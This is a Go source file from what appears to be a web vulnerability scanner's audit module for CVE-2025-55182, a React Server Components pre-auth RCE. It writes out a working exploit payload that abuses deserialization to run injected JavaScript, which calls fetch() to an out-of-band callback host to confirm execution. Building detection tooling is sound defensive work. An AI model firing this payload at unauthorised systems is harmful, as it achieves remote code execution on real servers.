package active

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"time"

	"github.com/pyneda/sukyan/db"
	"github.com/pyneda/sukyan/lib/integrations"
	"github.com/pyneda/sukyan/pkg/http_utils"
	"github.com/rs/zerolog/log"
)

// React2ShellAudit tests for CVE-2025-55182 React Server Components Pre-Auth RCE
// This vulnerability affects React 19.0.0-19.2.0 and allows pre-auth RCE
// through unsafe deserialization of payloads in Server Function endpoints.
type React2ShellAudit struct {
	Options             ActiveModuleOptions
	HistoryItem         *db.History
	InteractionsManager *integrations.InteractionsManager
}

const rscrceBoundary = "----sukyan-rsc-test"

// buildRSCPayload constructs the multipart/form-data payload for the React2shell exploit.
// The payload exploits prototype pollution in React Server Components' deserialization
// to achieve arbitrary code execution via the Function constructor.
//
// Credit: Lachlan Davidson (https://github.com/lachlan2k) for the original PoC.
func (a *React2ShellAudit) buildRSCPayload(callbackURL string) ([]byte, error) {
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	writer.SetBoundary(rscrceBoundary)

	// The payload structure exploits the RSC protocol's deserialization:
	// - Field "0" references field "1"
	// - Field "1" sets up a resolved_model with prototype chain manipulation
	// - Field "2" and "3" are helper references
	// - Field "4" contains the actual code to execute via _prefix

	fields := map[string]string{
		"0": `"$1"`,
		"1": `{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}`,
		"2": `"$@3"`,
		"3": `[]`,
		"4": fmt.Sprintf(`{"_prefix":"fetch(\"%s\").then(r => r.text()).then(t => console.log(t))//","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}`, callbackURL),
	}

	// Fields must be added in order (0, 1, 2, 3, 4)
	for i := 0; i <= 4; i++ {
		key := fmt.Sprintf("%d", i)
		if err := writer.WriteField(key, fields[key]); err != nil {
			return nil, fmt.Errorf("failed to write field %s: %w", key, err)
		}
	}

	if err := writer.Close(); err != nil {
		return nil, fmt.Errorf("failed to close multipart writer: %w", err)
	}

	return buf.Bytes(), nil
}

// Run executes the React2shell audit against the history item's URL
func (a *React2ShellAudit) Run() {
	ctx := a.Options.Ctx
	if ctx == nil {
		log.Info().Str("url", a.HistoryItem.URL).Msg("React2shell audit cancelled before starting - no context")
		return
	}

	// Check context before starting
	select {
	case <-ctx.Done():
		log.Info().Str("url", a.HistoryItem.URL).Msg("React2shell audit cancelled before starting")
		return
	default:
	}

	auditLog := log.With().
		Str("audit", "react2shell").
		Str("url", a.HistoryItem.URL).
		Uint("workspace", a.Options.WorkspaceID).
		Logger()

	interactionData := a.InteractionsManager.GetURL()
	callbackURL := fmt.Sprintf("http://%s/rsc", interactionData.URL)

	payload, err := a.buildRSCPayload(callbackURL)
	if err != nil {
		auditLog.Error().Err(err).Msg("Failed to build RSC payload")
		return
	}

	request, err := http_utils.BuildRequestFromHistoryItem(a.HistoryItem)
	if err != nil {
		auditLog.Error().Err(err).Msg("Failed to create request")
		return
	}

	request = request.WithContext(ctx)
	request.Method = "POST"
	request.Body = io.NopCloser(bytes.NewReader(payload))
	request.ContentLength = int64(len(payload))

	// Set required headers for Next.js Server Actions
	request.Header.Set("Content-Type", fmt.Sprintf("multipart/form-data; boundary=%s", rscrceBoundary))
	request.Header.Set("next-action", "x") // Triggers Server Action handling in Next.js

	insertionPoint := "RSC Server Action endpoint"
	oobTest, err := db.Connection().CreateOOBTest(db.OOBTest{
		Code:              db.React2shellCode,
		TestName:          "React2Shell",
		InteractionDomain: interactionData.URL,
		InteractionFullID: interactionData.ID,
		Target:            a.HistoryItem.URL,
		Payload:           string(payload),
		InsertionPoint:    insertionPoint,
		WorkspaceID:       &a.Options.WorkspaceID,
		TaskID:            &a.Options.TaskID,
		TaskJobID:         &a.Options.TaskJobID,
		ScanID:            &a.Options.ScanID,
		ScanJobID:         &a.Options.ScanJobID,
	})
	if err != nil {
		auditLog.Error().Err(err).Str("interaction_domain", interactionData.URL).Msg("Failed to create OOB test")
		return
	}

	historyOptions := http_utils.HistoryCreationOptions{
		Source:              db.SourceScanner,
		WorkspaceID:         a.Options.WorkspaceID,
		TaskID:              a.Options.TaskID,
		ScanID:              a.Options.ScanID,
		ScanJobID:           a.Options.ScanJobID,
		TaskJobID:           a.Options.TaskJobID,
		CreateNewBodyStream: false,
	}

	client := a.Options.HTTPClient
	if client == nil {
		client = http_utils.CreateHttpClient()
	}
	executionResult := http_utils.ExecuteRequest(request, http_utils.RequestExecutionOptions{
		Client:                 client,
		CreateHistory:          true,
		HistoryCreationOptions: historyOptions,
		Timeout:                10 * time.Second,
	})

	var history *db.History = executionResult.History

	if executionResult.Err != nil {
		auditLog.Error().Err(executionResult.Err).Msg("Request execution failed")
		// Still create a history record with the request so OOB detection has data to show
		if history == nil {
			// Need to rebuild request since body was consumed
			newRequest, rebuildErr := http_utils.BuildRequestFromHistoryItem(a.HistoryItem)
			if rebuildErr == nil {
				newRequest = newRequest.WithContext(ctx)
				newRequest.Method = "POST"
				newRequest.Body = io.NopCloser(bytes.NewReader(payload))
				newRequest.ContentLength = int64(len(payload))
				newRequest.Header.Set("Content-Type", fmt.Sprintf("multipart/form-data; boundary=%s", rscrceBoundary))
				newRequest.Header.Set("next-action", "x")
				var createErr error
				history, createErr = http_utils.CreateTimeoutHistory(newRequest, executionResult.Duration, executionResult.Err, historyOptions)
				if createErr != nil {
					auditLog.Error().Err(createErr).Msg("Failed to create timeout history")
				}
			} else {
				auditLog.Error().Err(rebuildErr).Msg("Failed to rebuild request for timeout history")
			}
		}
	} else {
		if history != nil {
			auditLog.Debug().
				Int("status_code", history.StatusCode).
				Msg("React2shell probe completed")
		}
	}

	if history != nil && history.ID != 0 {
		err := db.Connection().UpdateOOBTestHistoryID(oobTest.ID, &history.ID)
		if err != nil {
			auditLog.Error().Err(err).Msg("Failed to update OOBTest with history ID for React2shell audit")
		}
	}

	auditLog.Info().Uint("oob_test_id", oobTest.ID).Msg("React2shell audit completed, awaiting OOB callback")
}
